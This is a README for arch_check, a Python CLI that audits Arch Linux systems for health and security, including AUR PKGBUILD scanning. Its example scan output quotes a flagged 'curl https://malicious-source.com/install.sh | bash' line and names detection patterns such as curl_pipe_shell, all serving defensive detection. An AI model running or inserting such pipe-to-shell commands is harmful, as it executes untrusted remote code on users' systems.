# arch_check

**Arch Linux System Health & Security CLI**  
*Comprehensive system health, AUR security scanning, and disk ancestry for Arch Linux.*

---

## Overview

**arch_check** is a comprehensive CLI tool for Arch Linux that performs system health checks, security audits, and disk ancestry tracking. It offers three run modes for flexibility:

- **Quick mode** (`-q`): Fast health snapshot in seconds, no root required
- **Full audit** (`-a`): Complete system check including slow and security checks
- **Security mode** (`--security`): Security-focused checks only (ports, logins, rootkits)

Built with pure Python standard library (zero external dependencies), it glues together system utilities and presents results in a clear, colorized format with optional JSON output.

**Problem Solved:**
From basic disk usage to AUR package security scanning—arch_check consolidates 20+ system checks into one tool. Ideal for daily health snapshots, pre-update audits, or security reviews.

---

## Run Modes

```sh
arch-check -q               Quick health snapshot (seconds)
arch-check -a               Full audit (slower, some need root)
arch-check --security       Security-focused checks only
arch-check -q --security    Quick + security checks
arch-check -a --no-rkhunter Full audit, skip rkhunter
arch-check -j -q            Quick audit as JSON
```

---

## Key Features

### Core System Checks
- **Disk Usage & Origin:** Shows usage, free space, filesystem, and device ancestry for all major mounts (supports ext4, btrfs, LVM, LUKS). Skips virtual and temporary filesystems.
- **Temperature Sensors:** Reports all available temperature sensors and warns if any exceed thresholds.
- **SMART Disk Health:** Summarizes SMART status for all disks (if supported).
- **Kernel Version Check:** Detects mismatches between running and installed kernel (reboot required).
- **Config File Alerts:** Finds unmerged `.pacnew` and `.pacsave` config files with age analysis.
- **Failed Services:** Lists failed systemd services.
- **Orphaned Packages:** Detects unused dependency packages.
- **Pacman Statistics:** Summarizes package counts (native vs AUR) and cache size.

### Quick System Metrics
- **timedatectl:** NTP synchronization status, timezone verification
- **load-avg:** System load average vs CPU count (warns at 75%/100%)
- **inotify:** Inotify watch limit usage monitoring
- **checkupdates:** Pending package updates display (informational)
- **timers:** Systemd timer status, detects never-run or missed timers
- **boot-blame:** Boot timing analysis (slowest units, total boot time)
- **arch-audit:** AUR package vulnerability scanning (CVEs)

### AUR Security Scanning
- **aur-integrity:** Verify AUR package file integrity with `pacman -Qk`
- **aur-paths:** Detect files installed outside standard paths
- **aur-suid:** Find setuid/setgid files (with whitelist)
- **aur-pkgbuild:** Scan PKGBUILDs for suspicious patterns (curl|sh, eval, etc.)

### Slow Checks (Full Audit Only)
- **journal:** System journal errors (last 24h), grouped by unit
- **dmesg:** Kernel ring buffer errors (hardware, I/O, OOM)

### Security Checks
- **ports:** Listening TCP/UDP ports, detects unexpected/externally reachable services
- **failed-logins:** Failed login attempt analysis (brute-force detection)
- **rkhunter:** Rootkit scanner integration (requires rkhunter)

### Output Features
- **Colorized Output:** Auto-detects terminal, supports `--color`/`--no-color`
- **JSON Output:** Machine-readable output for scripting (`-j`)

---

## Skipped Filesystems

To keep output focused, arch_check skips virtual, temporary, and special-purpose filesystems:

**Skipped:** swap, tmpfs, devtmpfs, proc, sysfs, cgroup, mqueue, hugetlbfs, fusectl, configfs, securityfs, pstore, efivarfs, debugfs, tracefs, ramfs, overlay, squashfs, autofs, binfmt_misc, bpf, nsfs

---

## Prerequisites & Dependencies

- **Python:** 3.8 or newer
- **Arch Linux:** Required for full features
- **System packages (optional, for full features):**
  - `btrfs-progs` (btrfs usage/subvolume info)
  - `lm_sensors` (temperature sensors)
  - `smartmontools` (SMART disk health)
  - `pacman-contrib` (checkupdates command)
  - `arch-audit` (AUR vulnerability scanning)
  - `rkhunter` (rootkit scanning)

**Note:** Some checks require root privileges for full information (SMART, inotify usage, failed logins, rkhunter). Run with `sudo` when needed.

---

## Installation

**Recommended (pipx):**
```sh
pipx install .
```

**Arch Linux (PKGBUILD):**
```sh
makepkg -si
```
This installs the CLI as `/usr/bin/arch_check`.

---

## Usage

### Quick Start

```sh
arch-check -q              # Quick health snapshot
arch-check -a              # Full system audit
arch-check --security      # Security checks only
sudo arch-check -a         # Full audit with root privileges
```

### Available Flags

```
Run Modes:
  -q, --quick            Run quick health checks only (seconds, no root needed)
  -a, --all              Run all health checks (quick + slow + security)
  --security             Run security-focused checks only

Core Checks:
  -l, --logo             Print Arch logo and hardware summary
  --sensors              Temperature sensors
  -k, --kernel           Kernel version mismatch check
  -p, --pacnew           Config file alerts (.pacnew/.pacsave)
  -s, --services         Failed systemd services
  -o, --orphans          Orphaned packages
  -d, --disk             Disk usage and origin
  -t, --stats            Pacman statistics
  --smart                SMART disk health

Quick Checks:
  --timedatectl          NTP sync and timezone status
  --load-avg             System load vs CPU count
  --inotify              Inotify watch limit usage
  --checkupdates         Pending updates display
  --timers               Systemd timer status
  --boot-blame           Boot timing analysis
  --arch-audit           AUR vulnerability scanning

AUR Security:
  --aur-integrity        AUR package file integrity
  --aur-paths            Non-standard install paths
  --aur-suid             Setuid/setgid file detection
  --aur-pkgbuild         PKGBUILD security scanning

Slow Checks:
  --journal              Journal errors (24h)
  --dmesg                Kernel errors

Security:
  --ports                Listening ports analysis
  --failed-logins        Failed login attempts
  --rkhunter             Rootkit scanner (slow)

Output:
  -j, --json             JSON output for scripting
  --color / --no-color   Force color/no-color
```

---

## Examples

### `-d`, `--disk` - Disk Usage & Origin

**Example (ext4, LVM, LUKS):**
```
Mount           : Usage    : Free       : FS       : Type       : Device                 : Origin                               : Subvol
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/               :   32.0% :    127G GB : ext4     : 1.0        : /dev/volume-root       : nvme0n1.nvme0n1p2.cryptlvm.volume-root :
/boot           :   28.0% :    370M GB : vfat     : FAT32      : /dev/nvme0n1p1         : nvme0n1.nvme0n1p1                    :
/home           :   41.0% :    909G GB : ext4     : 1.0        : /dev/volume-home       : nvme0n1.nvme0n1p2.cryptlvm.volume-home :
```

### `--timedatectl` - Time & Date Sync

**Example:**
```
========== Time & Date (timedatectl) ==========
Timezone: America/New_York
NTP Service: active
Synchronized: yes
Local Time: 2024-01-15 14:32:45
```

### `--load-avg` - System Load

**Example:**
```
========== System Load Average ==========
CPU Count: 8
Load Average (1/5/15 min): 0.45 / 0.52 / 0.48
Threshold (15-min): 8
```

### `--aur-integrity` - AUR Package Integrity

**Example:**
```
========== AUR Package Integrity ==========
Warning: 1 package(s) with integrity issues:

google-chrome
  Modified files: 2
    - /opt/google/chrome/MEIPreload/preflight
    ... and 1 more
```

### `--ports` - Listening Ports

**Example:**
```
========== Listening Ports ==========
PROTO : ADDRESS          : PORT  : PROCESS           : MANAGED
───────────────────────────────────────────────────────────────────
tcp   : 127.0.0.1        : 3306  : mysqld            : yes
tcp   : 0.0.0.0          : 80    : nginx             : yes
```

### `-p`, `--pacnew` - Config Files with Age

**Example:**
```
========== Config Files (.pacnew/.pacsave) ==========
  -> /etc/pacman.conf.pacnew (2 days old)
  -> /etc/pulse/default.pa.pacnew (45 days old)
  -> /etc/ssh/sshd_config.pacnew (120 days old)
```

### `--aur-pkgbuild` - PKGBUILD Security Scanning with Safe Pattern Exclusions

**Recent Update:** Added intelligent exclusion filters for known safe patterns to reduce false positives.

**Example Output:**
```
========== AUR PKGBUILD Security Scan ==========

Suspicious patterns detected:

malicious-package (from yay cache)
  Patterns: curl_pipe_shell, eval_subshell
  Line 45: curl https://malicious-source.com/install.sh | bash
    [FLAGGED]
  Excluded (known safe patterns):
    Line 23: python -c "import site; print(site.getsitepackages())"
      → standard idiom to locate site-packages install path
    Line 28: pip install --no-deps ./wheel-file.whl
      → used in -bin packages to install pre-built wheel without remote dependencies

Summary: 1542 scanned, 12 not cached (manual review), 3 flagged
```

**Safe Pattern Exclusions (Auto-Whitelisted):**

The PKGBUILD scanner now recognizes these common safe patterns and excludes them from flagging:

1. **`python -c "import site..."`** — Standard idiom to locate site-packages directory, present in hundreds of legitimate PKGBUILDs
2. **`python -c "import sys..."`** — Used to check Python version or sys.path at build time
3. **`python -c "from distutils..."`** — Legacy distutils path/version lookup, common in older PKGBUILDs
4. **`pip install --no-deps`** — Used in -bin packages to install local pre-built wheels without pulling remote dependencies

**Auditable Output:** Whitelisted lines are shown with explanatory reasons in the human output and included in JSON for audit trails.

---

## JSON Output

When using `-j`, arch_check returns structured output with per-section status and issues:

```json
{
  "disk": {
    "mounts": [...],
    "status": "ok",
    "issues": 0
  },
  "aur_integrity": {
    "status": "attention",
    "issues": 1,
    "packages_checked": 15,
    "packages_with_issues": [...]
  },
  "summary": {
    "issues": 2,
    "issues_by_section": {
      "disk": 0,
      "aur_integrity": 1,
      "ports": 1
    },
    "status": "attention"
  }
}
```

---

## Contributing

Found a bug or want to add a feature? Please open an issue or submit a pull request on the [GitHub repository](https://github.com/kidpixo/arch_check).

---

## License

**0BSD** — Free for any use, no warranty.
